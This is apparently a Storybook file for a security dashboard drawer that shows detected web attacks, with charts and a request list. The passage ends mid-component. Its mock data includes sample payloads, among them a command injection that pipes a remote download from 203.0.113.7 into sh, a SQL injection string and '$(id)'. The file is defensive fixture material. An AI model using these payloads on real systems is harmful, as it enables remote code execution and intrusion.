import { type MouseEvent, useState } from 'react';

import type { Meta, StoryFn } from 'storybook-react-rsbuild';
import { fn } from 'storybook/test';

import { Attribute, AttributeLabel, AttributeValue } from '../../components/Attribute';
import { Badge } from '../../components/Badge';
import { Button } from '../../components/Button';
import {
  CodeSnippetCode,
  CodeSnippetContent,
  CodeSnippetLineNumbers,
  CodeSnippetRoot,
  InlineCodeSnippet,
} from '../../components/CodeSnippet';
import {
  Drawer,
  DrawerBody,
  DrawerContent,
  DrawerHeader,
  DrawerResizeHandle,
  DrawerTrigger,
} from '../../components/Drawer';
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuItemText,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from '../../components/DropdownMenu';
import { FilterInput } from '../../components/FilterInput';
import { FormatDateTime } from '../../components/FormatDateTime';
import { Heading } from '../../components/Heading';
import { HttpMethod } from '../../components/HttpMethod';
import { Ip, IpAddress, IpCountry } from '../../components/Ip';
import { Page, PageContent, PageHeader, PageHeaderGroup, PageTitle } from '../../components/Page';
import { ResponseCode } from '../../components/ResponseCode';
import {
  ScrollArea,
  ScrollAreaContent,
  ScrollAreaScrollbar,
  ScrollAreaViewport,
} from '../../components/ScrollArea';
import { Separator } from '../../components/Separator';
import {
  BarList,
  BarListBar,
  BarListItem,
  BarListLabel,
  BarListPercent,
  BarListSkeleton,
  BarListValue,
  Chart,
  ChartHeader,
  ChartTitle,
  LegendDot,
  LineChart,
  LineChartBody,
  type LineChartDatum,
  LineChartEmpty,
  LineChartGrid,
  LineChartLine,
  type LineChartSeries,
  LineChartTooltip,
  LineChartXAxis,
  LineChartYAxis,
  PieChart,
  PieChartCenter,
  PieChartCenterLabel,
  PieChartCenterValue,
  PieChartDonut,
  PieChartLegend,
  PieChartLegendItem,
  PieChartLegendPercent,
  PieChartLegendValue,
  PieChartSkeleton,
  useChartTimeFormatters,
} from '../../components/SimpleCharts';
import { HStack, VStack } from '../../components/Stack';
import type { TableColumnDef } from '../../components/Table';
import { Table } from '../../components/Table';
import { Tabs, TabsList, TabsTrigger } from '../../components/Tabs';
import { Text } from '../../components/Text';
import { Tooltip, TooltipContent, TooltipTrigger } from '../../components/Tooltip';
import { ArrowDown, Link } from '../../icons';

interface Share {
  name: string;
  value: number;
}

interface AttackRequest {
  id: string;
  time: string;
  status: number;
  attackTypes: string[];
  method: string;
  path: string;
  host: string;
  ip: string;
  user: string;
  sessionId: string;
  parameter: string;
  payload: string;
  raw: string;
}

interface Attack {
  id: string;
  name: string;
  type: string;
  status: 'Monitoring' | 'Blocked';
  firstSeen: string;
  lastSeen: string;
  total: number;
  blocked: number;
  sessions: number;
  country: 'US';
  ips: Share[];
  users: Share[];
  hosts: Share[];
  statusCodes: Share[];
  requests: AttackRequest[];
}

const RAW_REQUEST = [
  'POST /api/v1/accounts/sync HTTP/1.1',
  'Host: crm.example.com',
  'Content-Type: application/json',
  'User-Agent: python-requests/2.31',
  '',
  '{"params":{"arguments":{"account_id":"1; curl http://203.0.113.7/x | sh"}}}',
].join('\n');

const REQUESTS: AttackRequest[] = [
  {
    id: 'req-1',
    time: '2026-11-06T10:13:48Z',
    status: 200,
    attackTypes: ['RCE'],
    method: 'POST',
    path: '/api/v1/accounts/sync',
    host: 'crm.example.com',
    ip: '10.56.2.15',
    user: 'attacker1@malicious.example',
    sessionId: 'b7e3c1d0a9f24e6c',
    parameter: 'post.json_doc.params.arguments.account_id',
    payload: '1; curl http://203.0.113.7/x | sh',
    raw: RAW_REQUEST,
  },
  {
    id: 'req-2',
    time: '2026-11-06T10:12:31Z',
    status: 403,
    attackTypes: ['RCE', 'SQLi'],
    method: 'POST',
    path: '/api/v1/accounts/sync',
    host: 'crm.example.com',
    ip: '10.56.1.9',
    user: 'attacker3@malicious.example',
    sessionId: '4f0a6d2e81c35b97',
    parameter: 'post.json_doc.params.arguments.account_id',
    payload: "1' OR '1'='1",
    raw: RAW_REQUEST,
  },
  {
    id: 'req-3',
    time: '2026-11-06T09:58:02Z',
    status: 200,
    attackTypes: ['RCE'],
    method: 'GET',
    path: '/api/v1/accounts/export',
    host: 'crm.example.com',
    ip: '10.56.2.15',
    user: 'attacker4@malicious.example',
    sessionId: '9c21e7f4b0d86a35',
    parameter: 'get.query.format',
    payload: '$(id)',
    raw: RAW_REQUEST,
  },
];

const RCE: Attack = {
  id: 'atk-rce',
  name: 'Remote code execution from 2 IPs in post.json_doc.params.arguments.account_id',
  type: 'RCE',
  status: 'Monitoring',
  firstSeen: '2026-11-06T00:13:13Z',
  lastSeen: '2026-11-06T10:13:48Z',
  total: 55,
  blocked: 0,
  sessions: 4,
  country: 'US',
  ips: [
    { name: '10.56.2.15', value: 35 },
    { name: '10.56.1.9', value: 20 },
  ],
  users: [
    { name: 'attacker1@malicious.example', value: 15 },
    { name: 'attacker3@malicious.example', value: 15 },
    { name: 'attacker4@malicious.example', value: 15 },
    { name: 'attacker2@malicious.example', value: 10 },
  ],
  hosts: [{ name: 'crm.example.com', value: 55 }],
  statusCodes: [
    { name: '2XX', value: 41 },
    { name: '4XX', value: 14 },
  ],
  requests: REQUESTS,
};

const TRAVERSAL: Attack = {
  ...RCE,
  id: 'atk-traversal',
  name: 'Path traversal from 10.56.2.15 in post.json_doc.params.arguments.file_path',
  type: 'Path traversal',
  status: 'Blocked',
  total: 12,
  blocked: 12,
  sessions: 1,
  ips: [{ name: '10.56.2.15', value: 12 }],
  users: [{ name: 'attacker1@malicious.example', value: 12 }],
  hosts: [{ name: 'crm.example.com', value: 12 }],
  statusCodes: [{ name: '4XX', value: 12 }],
  requests: REQUESTS.slice(0, 1),
};

const ATTACKS: Attack[] = [RCE, TRAVERSAL];

// Requests per half hour over one day, with a burst in the morning.
const TIMELINE: LineChartDatum[] = Array.from({ length: 48 }, (_, i) => ({
  timestamp: new Date(2026, 10, 6, 0, i * 30).getTime(),
  requests: i >= 18 && i <= 21 ? [6, 14, 9, 4][i - 18] : i % 7 === 0 ? 1 : 0,
}));
const TIMELINE_SERIES: LineChartSeries[] = [{ key: 'requests', label: 'Requests', color: 'brand' }];

const STATUS_COLOR = { '2XX': 'green', '3XX': 'blue', '4XX': 'amber', '5XX': 'red' } as const;
const RCE_STATUS_CODES = RCE.statusCodes.map(row => ({
  ...row,
  color: STATUS_COLOR[row.name as keyof typeof STATUS_COLOR],
}));

const onCopyLink = fn().mockName('onCopyLink');
const onSaveDrawerWidth = fn().mockName('onSaveDrawerWidth');
const onMarkFalsePositive = fn().mockName('onMarkFalsePositive');
const onAddIpToDenylist = fn().mockName('onAddIpToDenylist');

const getAttackId = (attack: Attack) => attack.id;
const sumValues = (rows: Share[]) => rows.reduce((sum, row) => sum + row.value, 0);
const formatCount = (value: number) => value.toLocaleString('en-US');

const meta = {
  title: 'Patterns/Complex drawer',
  parameters: {
    layout: 'fullscreen',
    docs: {
      description: {
        component:
          'Use when a row click opens a wide drawer about one event — an attack, an incident, a session — with a summary header, tabs, an attribute card, chart cards and a list-and-detail split.',
      },
    },
  },
} satisfies Meta;

export default meta;

/**
 * Click an attack: one shared, non-modal drawer opens. Its header carries the summary and the
 * tabs; Overview scrolls in `DrawerBody`, Requests splits into a list and a detail that scroll on
 * their own.
 */
export const Default: StoryFn = () => {
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [open, setOpen] = useState(false);
  const [tab, setTab] = useState('overview');
  const [requestId, setRequestId] = useState<string | null>(null);
  const { formatHour, formatHourWithTimezone } = useChartTimeFormatters();

  const attack = ATTACKS.find(item => item.id === selectedId) ?? null;
  const request = attack?.requests.find(item => item.id === requestId) ?? null;

  const columns: TableColumnDef<Attack>[] = [
    { accessorKey: 'name', header: 'Attack', size: 520 },
    { accessorKey: 'type', header: 'Type', size: 160 },
    { accessorKey: 'status', header: 'Status', size: 140 },
    { accessorKey: 'total', header: 'Requests', size: 120 },
  ];

  const handleMasterCellClick = (id: string) => {
    setSelectedId(id);
    setTab('overview');
    setRequestId(null);
    setOpen(true);
  };
  const handleCopyLink = () => onCopyLink(attack);
  const handleSelectRequest = (event: MouseEvent<HTMLButtonElement>) =>
    setRequestId(event.currentTarget.value);

  return (
    <Page name='events-attacks' fullSize fixedHeight data-testid='attacks-page'>
      <PageHeader>
        <PageHeaderGroup>
          <PageTitle>Attacks</PageTitle>
        </PageHeaderGroup>
      </PageHeader>

      <PageContent>
        <Table
          aria-label='Attacks'
          data={ATTACKS}
          columns={columns}
          getRowId={getAttackId}
          activeRowId={open ? selectedId : null}
          onMasterCellClick={handleMasterCellClick}
          data-testid='attacks-table'
        />
      </PageContent>

      <Drawer
        open={open}
        onOpenChange={setOpen}
        modal={false}
        overlay={false}
        closeOnOutsideClick={false}
        width={1064}
        data-testid='attack-drawer'
      >
        <DrawerContent>
          <DrawerResizeHandle onResizeEnd={onSaveDrawerWidth} />
          <DrawerHeader>
            <HStack align='start' justify='between' gap={16} fullWidth className='min-w-0'>
              <VStack gap={4} className='min-w-0'>
                <Heading as='h2' size='xl' weight='medium' truncate>
                  {attack?.name}
                </Heading>
                <HStack gap={4} align='center'>
                  <Badge
                    variant='dotted'
                    type='secondary'
                    size='medium'
                    color={attack?.status === 'Blocked' ? 'red' : 'amber'}
                  >
                    {attack?.status}
                  </Badge>
                  <Text size='xs' color='secondary'>
                    ·
                  </Text>
                  <Text size='xs' color='secondary'>
                    {attack?.blocked}/{attack?.total} blocked
                  </Text>
                  <Text size='xs' color='secondary'>
                    ·
                  </Text>
                  <Text size='xs' color='secondary'>
                    {attack?.ips.length} IPs across 1 country
                  </Text>
                </HStack>
              </VStack>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant='ghost'
                    color='neutral'
                    size='small'
                    aria-label='Copy link'
                    onClick={handleCopyLink}
                  >
                    <Link />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>Copy link</TooltipContent>
              </Tooltip>
            </HStack>
          </DrawerHeader>
          <Tabs value={tab} onChange={setTab} data-testid='attack-tabs'>
            <TabsList>
              <TabsTrigger value='overview'>Overview</TabsTrigger>
              <TabsTrigger value='requests'>
                Requests
                <Badge type='secondary' color='slate' size='medium' className='ml-4'>
                  {attack?.total}
                </Badge>
              </TabsTrigger>
            </TabsList>
          </Tabs>

          {tab === 'overview' && (
            <DrawerBody>
              <VStack gap={12} className='py-16'>
                <div
                  className='grid grid-cols-2 gap-x-8 gap-y-16 rounded-8 border border-border-primary-light p-16'
                  data-testid='attack-info-card'
                >
                  <Attribute>
                    <AttributeLabel>Status</AttributeLabel>
                    <AttributeValue>
                      <Badge variant='dotted' type='secondary' size='medium' color='amber'>
                        {attack?.status}
                      </Badge>
                    </AttributeValue>
                  </Attribute>
                  <Attribute>
                    <AttributeLabel>First seen</AttributeLabel>
                    <AttributeValue>
                      <FormatDateTime
                        value={attack?.firstSeen ?? ''}
                        format='datetime'
                        layout='inline'
                      />
                    </AttributeValue>
                  </Attribute>
                  <Attribute>
                    <AttributeLabel>Attack type</AttributeLabel>
                    <AttributeValue>
                      <Badge type='secondary' color='slate' size='medium'>
                        {attack?.type}
                      </Badge>
                    </AttributeValue>
                  </Attribute>
                  <Attribute>
                    <AttributeLabel>Last seen</AttributeLabel>
                    <AttributeValue>
                      <FormatDateTime
                        value={attack?.lastSeen ?? ''}
                        format='datetime'
                        layout='inline'
                      />
                    </AttributeValue>
                  </Attribute>
                  <Attribute>
                    <AttributeLabel>Sessions</AttributeLabel>
                    <AttributeValue>{formatCount(attack?.sessions ?? 0)} sessions</AttributeValue>
                  </Attribute>
                  <Attribute>
                    <AttributeLabel>Users</AttributeLabel>
                    <AttributeValue>{attack?.users[0]?.name}</AttributeValue>
                  </Attribute>
                  <Attribute className='col-span-2'>
                    <AttributeLabel>IPs</AttributeLabel>
                    <AttributeValue>
                      <HStack gap={8}>
                        {attack?.ips.map(ip => (
                          <Ip key={ip.name}>
                            <IpCountry code={attack.country} />
                            <IpAddress>{ip.name}</IpAddress>
                          </Ip>
                        ))}
                      </HStack>
                    </AttributeValue>
                  </Attribute>
                </div>
                <Chart>
                  <ChartHeader>
                    <ChartTitle>Timeline</ChartTitle>
                  </ChartHeader>
                  <LineChart data={TIMELINE} series={TIMELINE_SERIES} xKey='timestamp'>
                    <LineChartBody>
                      <LineChartGrid />
                      <LineChartXAxis tickFormatter={formatHour} minTickGap={48} />
                      <LineChartYAxis />
                      <LineChartLine seriesKey='requests' curve='linear' />
                      <LineChartTooltip xTickFormatter={formatHourWithTimezone} />
                    </LineChartBody>
                  </LineChart>
                </Chart>
                <div className='grid grid-cols-2 gap-12'>
                  <Chart>
                    <ChartHeader>
                      <ChartTitle>Top 5 hosts</ChartTitle>
                    </ChartHeader>
                    <BarList max={sumValues(attack?.hosts ?? [])}>
                      {attack?.hosts.map(row => (
                        <BarListItem key={row.name} value={row.value}>
                          <BarListBar />
                          <BarListLabel>{row.name}</BarListLabel>
                          <BarListValue>
                            <BarListPercent />
                          </BarListValue>
                        </BarListItem>
                      ))}
                    </BarList>
                  </Chart>
                  <Chart>
                    <ChartHeader>
                      <ChartTitle>Top 5 IPs</ChartTitle>
                    </ChartHeader>
                    <BarList max={sumValues(attack?.ips ?? [])}>
                      {attack?.ips.map(row => (
                        <BarListItem key={row.name} value={row.value}>
                          <BarListBar />
                          <BarListLabel>{row.name}</BarListLabel>
                          <BarListValue>
                            <BarListPercent />
                          </BarListValue>
                        </BarListItem>
                      ))}
                    </BarList>
                  </Chart>
                </div>
              </VStack>
            </DrawerBody>
          )}

          {tab === 'requests' && (
            <div className='flex min-h-0 flex-1 flex-col' data-testid='attack-requests'>
              <HStack gap={8} className='shrink-0 border-b border-border-primary-light px-16 py-8'>
                <div className='min-w-0 flex-1'>
                  <FilterInput placeholder='Filter requests...' />
                </div>
                <Button variant='ghost' color='neutral' size='small'>
                  <ArrowDown /> Date
                </Button>
              </HStack>
              <div className='flex min-h-0 flex-1'>
                <div className='w-320 shrink-0 border-r border-border-primary-light'>
                  <ScrollArea>
                    <ScrollAreaViewport>
                      <ScrollAreaContent>
                        <VStack gap={2} className='p-8' data-testid='attack-request-list'>
                          {attack?.requests.map(item => (
                            <button
                              key={item.id}
                              type='button'
                              value={item.id}
                              aria-pressed={item.id === requestId}
                              onClick={handleSelectRequest}
                              className={
                                item.id === requestId
                                  ? 'w-full rounded-8 bg-states-primary-default-alt p-8 text-left'
                                  : 'w-full rounded-8 p-8 text-left hover:bg-states-primary-hover'
                              }
                            >
                              <VStack gap={2}>
                                <HStack gap={4}>
                                  <FormatDateTime
                                    value={item.time}
                                    format='datetime'
                                    layout='inline'
                                  />
                                  <div className='ml-auto'>
                                    <ResponseCode code={item.status} />
                                  </div>
                                </HStack>
                                <HStack gap={4}>
                                  {item.attackTypes.map(type => (
                                    <Badge key={type} type='secondary' color='slate' size='medium'>
                                      {type}
                                    </Badge>
                                  ))}
                                </HStack>
                                <HStack gap={4}>
                                  <HttpMethod method={item.method} />
                                  <Text size='xs' truncate>
                                    {item.path}
                                  </Text>
                                </HStack>
                                <Text size='xs' color='secondary' truncate>
                                  {item.host}
                                </Text>
                              </VStack>
                            </button>
                          ))}
                        </VStack>
                      </ScrollAreaContent>
                    </ScrollAreaViewport>
                    <ScrollAreaScrollbar />
                  </ScrollArea>
                </div>
                <div className='min-w-0 flex-1' data-testid='attack-request'>
                  {request ? (
                    <ScrollArea>
                      <ScrollAreaViewport>
                        <ScrollAreaContent>
                          <HStack justify='between' className='px-24 py-8'>
                            <Text size='md'>Request details</Text>
                            <DropdownMenu>
                              <DropdownMenuTrigger asChild>
                                <Button variant='outline' color='neutral' size='small'>
                                  Actions
                                </Button>
                              </DropdownMenuTrigger>
                              <DropdownMenuContent>
                                <DropdownMenuItem onSelect={onMarkFalsePositive}>
                                  <DropdownMenuItemText>
                                    Mark as false positive
                                  </DropdownMenuItemText>
                                </DropdownMenuItem>
                                <DropdownMenuSeparator />
                                <DropdownMenuItem
                                  variant='destructive'
                                  onSelect={onAddIpToDenylist}
                                >
                                  <DropdownMenuItemText>Add IP to denylist</DropdownMenuItemText>
                                </DropdownMenuItem>
                              </DropdownMenuContent>
                            </DropdownMenu>
                          </HStack>
                          <div className='grid grid-cols-2 gap-x-8 gap-y-6 px-24 pb-8'>
                            <Attribute orientation='horizontal'>
                              <AttributeLabel>Source IP</AttributeLabel>
                              <AttributeValue>
                                <Ip>
                                  <IpCountry code={attack?.country ?? 'US'} />
                                  <IpAddress>{request.ip}</IpAddress>
                                </Ip>
                              </AttributeValue>
                            </Attribute>
                            <Attribute orientation='horizontal'>
                              <AttributeLabel>Request ID</AttributeLabel>
                              <AttributeValue>
                                <InlineCodeSnippet code={request.id} size='sm' />
                              </AttributeValue>
                            </Attribute>
                            <Attribute orientation='horizontal'>
                              <AttributeLabel>User</AttributeLabel>
                              <AttributeValue>{request.user}</AttributeValue>
                            </Attribute>
                            <Attribute orientation='horizontal'>
                              <AttributeLabel>Session ID</AttributeLabel>
                              <AttributeValue>
                                <InlineCodeSnippet code={request.sessionId} size='sm' />
                              </AttributeValue>
                            </Attribute>
                            <Attribute orientation='horizontal' className='col-span-2'>
                              <AttributeLabel>URI</AttributeLabel>
                              <AttributeValue>
                                <HStack gap={6}>
                                  <HttpMethod method={request.method} />
                                  <Text size='sm' truncate>
                                    {request.path}
                                  </Text>
                                </HStack>
                              </AttributeValue>
                            </Attribute>
                          </div>
                          <div className='px-24 py-4'>
                            <Separator />
                          </div>
                          <div className='px-24 py-8'>
                            <Text size='md'>Full request</Text>
                          </div>
                          <div className='px-24 pb-16'>
                            <CodeSnippetRoot
                              code={request.raw}
                              language='text'
                              maxLines={15}
                              wrapLines
                            >
                              <CodeSnippetContent>
                                <CodeSnippetLineNumbers />
                                <CodeSnippetCode />
                              </CodeSnippetContent>
                            </CodeSnippetRoot>
                          </div>
                        </ScrollAreaContent>
                      </ScrollAreaViewport>
                      <ScrollAreaScrollbar />
                    </ScrollArea>
                  ) : (
                    <div className='flex h-full items-center justify-center'>
                      <Text size='sm' color='secondary'>
                        Select a request to view details
                      </Text>
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}
        </DrawerContent>
      </Drawer>
    </Page>
  );
};

/**
 * The header is two lines: a truncated `Heading` with the event name, then the summary — status
 * `Badge`, then counts in secondary text split by middle dots. One icon button sits before the
 * built-in close X. The tabs follow the header as their own strip, with a count `Badge`.
 */
export const Header: StoryFn = () => {
  const [tab, setTab] = useState('overview');

  const handleCopyLink = () => onCopyLink(RCE);

  return (
    <Drawer width={1064} data-testid='attack-drawer'>
      <DrawerTrigger asChild>
        <Button variant='outline' color='neutral'>
          View attack
        </Button>
      </DrawerTrigger>
      <DrawerContent>
        <DrawerHeader>
          <HStack align='start' justify='between' gap={16} fullWidth className='min-w-0'>
            <VStack gap={4} className='min-w-0' data-testid='attack-summary'>
              <Heading as='h2' size='xl' weight='medium' truncate>
                {RCE.name}
              </Heading>
              <HStack gap={4} align='center'>
                <Badge variant='dotted' type='secondary' size='medium' color='amber'>
                  {RCE.status}
                </Badge>
                <Text size='xs' color='secondary'>
                  ·
                </Text>
                <Text size='xs' color='secondary'>
                  {RCE.blocked}/{RCE.total} blocked
                </Text>
                <Text size='xs' color='secondary'>
                  ·
                </Text>
                <Text size='xs' color='secondary'>
                  {RCE.ips.length} IPs across 1 country
                </Text>
              </HStack>
            </VStack>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant='ghost'
                  color='neutral'
                  size='small'
                  aria-label='Copy link'
                  onClick={handleCopyLink}
                >
                  <Link />
                </Button>
              </TooltipTrigger>
              <TooltipContent>Copy link</TooltipContent>
            </Tooltip>
          </HStack>
        </DrawerHeader>
        <Tabs value={tab} onChange={setTab}>
          <TabsList>
            <TabsTrigger value='overview'>Overview</TabsTrigger>
            <TabsTrigger value='requests'>
              Requests
              <Badge type='secondary' color='slate' size='medium' className='ml-4'>
                {RCE.total}
              </Badge>
            </TabsTrigger>
          </TabsList>
        </Tabs>
      </DrawerContent>
    </Drawer>
  );
};

/**
 * Overview: the attributes sit in one bordered card, two columns, with the long list (IPs) across
 * both. Then the full-width timeline, then chart cards two per row.
 */
export const OverviewTab: StoryFn = () => {
  const { formatHour, formatHourWithTimezone } = useChartTimeFormatters();

  return (
    <Drawer width={1064} data-testid='attack-drawer'>
      <DrawerTrigger asChild>
        <Button variant='outline' color='neutral'>
          View attack
        </Button>
      </DrawerTrigger>
      <DrawerContent>
        <DrawerHeader>
          <Heading as='h2' size='xl' weight='medium' truncate>
            {RCE.name}
          </Heading>
        </DrawerHeader>
        <DrawerBody>
          <VStack gap={12} className='py-16' data-testid='attack-overview'>
            <div className='grid grid-cols-2 gap-x-8 gap-y-16 rounded-8 border border-border-primary-light p-16'>
              <Attribute>
                <AttributeLabel>Status</AttributeLabel>
                <AttributeValue>
                  <Badge variant='dotted' type='secondary' size='medium' color='amber'>
                    {RCE.status}
                  </Badge>
                </AttributeValue>
              </Attribute>
              <Attribute>
                <AttributeLabel>First seen</AttributeLabel>
                <AttributeValue>
                  <FormatDateTime value={RCE.firstSeen} format='datetime' layout='inline' />
                </AttributeValue>
              </Attribute>
              <Attribute>
                <AttributeLabel>Attack type</AttributeLabel>
                <AttributeValue>
                  <Badge type='secondary' color='slate' size='medium'>
                    {RCE.type}
                  </Badge>
                </AttributeValue>
              </Attribute>
              <Attribute>
                <AttributeLabel>Last seen</AttributeLabel>
                <AttributeValue>
                  <FormatDateTime value={RCE.lastSeen} format='datetime' layout='inline' />
                </AttributeValue>
              </Attribute>
              <Attribute>
                <AttributeLabel>Sessions</AttributeLabel>
                <AttributeValue>{formatCount(RCE.sessions)} sessions</AttributeValue>
              </Attribute>
              <Attribute>
                <AttributeLabel>Users</AttributeLabel>
                <AttributeValue>{RCE.users[0]?.name}</AttributeValue>
              </Attribute>
              <Attribute className='col-span-2'>
                <AttributeLabel>IPs</AttributeLabel>
                <AttributeValue>
                  <HStack gap={8}>
                    {RCE.ips.map(ip => (
                      <Ip key={ip.name}>
                        <IpCountry code={RCE.country} />
                        <IpAddress>{ip.name}</IpAddress>
                      </Ip>
                    ))}
                  </HStack>
                </AttributeValue>
              </Attribute>
            </div>
            <Chart>
              <ChartHeader>
                <ChartTitle>Timeline</ChartTitle>
              </ChartHeader>
              <LineChart data={TIMELINE} series={TIMELINE_SERIES} xKey='timestamp'>
                <LineChartBody>
                  <LineChartGrid />
                  <LineChartXAxis tickFormatter={formatHour} minTickGap={48} />
                  <LineChartYAxis />
                  <LineChartLine seriesKey='requests' curve='linear' />
                  <LineChartTooltip xTickFormatter={formatHourWithTimezone} />
                </LineChartBody>
              </LineChart>
            </Chart>
            <div className='grid grid-cols-2 gap-12'>
              <Chart>
                <ChartHeader>
                  <ChartTitle>Top 5 hosts</ChartTitle>
                </ChartHeader>
                <BarList max={sumValues(RCE.hosts)}>
                  {RCE.hosts.map(row => (
                    <BarListItem key={row.name} value={row.value}>
                      <BarListBar />
                      <BarListLabel>{row.name}</BarListLabel>
                      <BarListValue>
                        <BarListPercent />
                      </BarListValue>
                    </BarListItem>
                  ))}
                </BarList>
              </Chart>
              <Chart>
                <ChartHeader>
                  <ChartTitle>Status codes</ChartTitle>
                </ChartHeader>
                <PieChart data={RCE_STATUS_CODES} total={sumValues(RCE_STATUS_CODES)}>
                  <PieChartDonut>
                    <PieChartCenter>
                      <PieChartCenterValue>{formatCount(RCE.total)}</PieChartCenterValue>
                      <PieChartCenterLabel pluralize={{ one: 'request', other: 'requests' }} />
                    </PieChartCenter>
                  </PieChartDonut>
                  <PieChartLegend>
                    {RCE_STATUS_CODES.map(row => (
                      <PieChartLegendItem key={row.name} name={row.name}>
                        <Badge color={row.color} type='secondary' textVariant='code'>
                          {row.name}
                        </Badge>
                        <PieChartLegendValue>
                          {formatCount(row.value)}
                          <LegendDot />
                          <PieChartLegendPercent />
                        </PieChartLegendValue>
                      </PieChartLegendItem>
                    ))}
                  </PieChartLegend>
                </PieChart>
              </Chart>
              <Chart>
                <ChartHeader>
                  <ChartTitle>Top 5 IPs</ChartTitle>
                </ChartHeader>
                <BarList max={sumValues(RCE.ips)}>
                  {RCE.ips.map(row => (
                    <BarListItem key={row.name} value={row.value}>
                      <BarListBar />
                      <BarListLabel>{row.name}</BarListLabel>
                      <BarListValue>
                        <BarListPercent />
                      </BarListValue>
                    </BarListItem>
                  ))}
                </BarList>
              </Chart>
              <Chart>
                <ChartHeader>
                  <ChartTitle>Top 5 users</ChartTitle>
                </ChartHeader>
                <BarList max={sumValues(RCE.users)}>
                  {RCE.users.map(row => (
                    <BarListItem key={row.name} value={row.value}>
                      <BarListBar />
                      <BarListLabel>{row.name}</BarListLabel>
                      <BarListValue>
                        <BarListPercent />
                      </BarListValue>
                    </BarListItem>
                  ))}
                </BarList>
              </Chart>
            </div>
          </VStack>
        </DrawerBody>
      </DrawerContent>
    </Drawer>
  );
};

/**
 * Requests: a list and a detail side by side, each scrolling on its own, so this tab takes the
 * place of `DrawerBody` instead of sitting in it. A filter bar spans both; each request is a card
 * of time and response code, attack types, method and path, host.
 */
export const RequestsTab: StoryFn = () => {
  const [requestId, setRequestId] = useState<string | null>('req-1');

  const request = REQUESTS.find(item => item.id === requestId) ?? null;

  const handleSelectRequest = (event: MouseEvent<HTMLButtonElement>) =>
    setRequestId(event.currentTarget.value);

  return (
    <Drawer width={1064} data-testid='attack-drawer'>
      <DrawerTrigger asChild>
        <Button variant='outline' color='neutral'>
          View requests
        </Button>
      </DrawerTrigger>
      <DrawerContent>
        <DrawerHeader>
          <Heading as='h2' size='xl' weight='medium' truncate>
            {RCE.name}
          </Heading>
        </DrawerHeader>
        <div className='flex min-h-0 flex-1 flex-col' data-testid='attack-requests'>
          <HStack gap={8} className='shrink-0 border-b border-border-primary-light px-16 py-8'>
            <div className='min-w-0 flex-1'>
              <FilterInput placeholder='Filter requests...' />
            </div>
            <Button variant='ghost' color='neutral' size='small'>
              <ArrowDown /> Date
            </Button>
          </HStack>
          <div className='flex min-h-0 flex-1'>
            <div className='w-320 shrink-0 border-r border-border-primary-light'>
              <ScrollArea>
                <ScrollAreaViewport>
                  <ScrollAreaContent>
                    <VStack gap={2} className='p-8' data-testid='attack-request-list'>
                      {REQUESTS.map(item => (
                        <button
                          key={item.id}
                          type='button'
                          value={item.id}
                          aria-pressed={item.id === requestId}
                          onClick={handleSelectRequest}
                          className={
                            item.id === requestId
                              ? 'w-full rounded-8 bg-states-primary-default-alt p-8 text-left'
                              : 'w-full rounded-8 p-8 text-left hover:bg-states-primary-hover'
                          }
                        >
                          <VStack gap={2}>
                            <HStack gap={4}>
                              <FormatDateTime value={item.time} format='datetime' layout='inline' />
                              <div className='ml-auto'>
                                <ResponseCode code={item.status} />
                              </div>
                            </HStack>
                            <HStack gap={4}>
                              {item.attackTypes.map(type => (
                                <Badge key={type} type='secondary' color='slate' size='medium'>
                                  {type}
                                </Badge>
                              ))}
                            </HStack>
                            <HStack gap={4}>
                              <HttpMethod method={item.method} />
                              <Text size='xs' truncate>
                                {item.path}
                              </Text>
                            </HStack>
                            <Text size='xs' color='secondary' truncate>
                              {item.host}
                            </Text>
                          </VStack>
                        </button>
                      ))}
                    </VStack>
                  </ScrollAreaContent>
                </ScrollAreaViewport>
                <ScrollAreaScrollbar />
              </ScrollArea>
            </div>
            <div className='min-w-0 flex-1' data-testid='attack-request'>
              {request && (
                <ScrollArea>
                  <ScrollAreaViewport>
                    <ScrollAreaContent>
                      <HStack justify='between' className='px-24 py-8'>
                        <Text size='md'>Request details</Text>
                        <DropdownMenu>
                          <DropdownMenuTrigger asChild>
                            <Button variant='outline' color='neutral' size='small'>
                              Actions
                            </Button>
                          </DropdownMenuTrigger>
                          <DropdownMenuContent>
                            <DropdownMenuItem onSelect={onMarkFalsePositive}>
                              <DropdownMenuItemText>Mark as false positive</DropdownMenuItemText>
                            </DropdownMenuItem>
                            <DropdownMenuSeparator />
                            <DropdownMenuItem variant='destructive' onSelect={onAddIpToDenylist}>
                              <DropdownMenuItemText>Add IP to denylist</DropdownMenuItemText>
                            </DropdownMenuItem>
                          </DropdownMenuContent>
                        </DropdownMenu>
                      </HStack>
                      <div className='grid grid-cols-2 gap-x-8 gap-y-6 px-24 pb-8'>
                        <Attribute orientation='horizontal'>
                          <AttributeLabel>Source IP</AttributeLabel>
                          <AttributeValue>
                            <Ip>
                              <IpCountry code={RCE.country} />
                              <IpAddress>{request.ip}</IpAddress>
                            </Ip>
                          </AttributeValue>
                        </Attribute>
                        <Attribute orientation='horizontal'>
                          <AttributeLabel>Request ID</AttributeLabel>
                          <AttributeValue>
                            <InlineCodeSnippet code={request.id} size='sm' />
                          </AttributeValue>
                        </Attribute>
                        <Attribute orientation='horizontal'>
                          <AttributeLabel>User</AttributeLabel>
                          <AttributeValue>{request.user}</AttributeValue>
                        </Attribute>
                        <Attribute orientation='horizontal'>
                          <AttributeLabel>Session ID</AttributeLabel>
                          <AttributeValue>
                            <InlineCodeSnippet code={request.sessionId} size='sm' />
                          </AttributeValue>
                        </Attribute>
                        <Attribute orientation='horizontal' className='col-span-2'>
                          <AttributeLabel>URI</AttributeLabel>
                          <AttributeValue>
                            <HStack gap={6}>
                              <HttpMethod method={request.method} />
                              <Text size='sm' truncate>
                                {request.path}
                              </Text>
                            </HStack>
                          </AttributeValue>
                        </Attribute>
                      </div>
                      <div className='px-24 py-4'>
                        <Separator />
                      </div>
                      <div className='px-24 py-8'>
                        <Text size='md'>Attack</Text>
                      </div>
                      <div className='grid grid-cols-1 gap-y-6 px-24 pb-8'>
                        <Attribute orientation='horizontal'>
                          <AttributeLabel>Parameter</AttributeLabel>
                          <AttributeValue>
                            <InlineCodeSnippet code={request.parameter} size='sm' />
                          </AttributeValue>
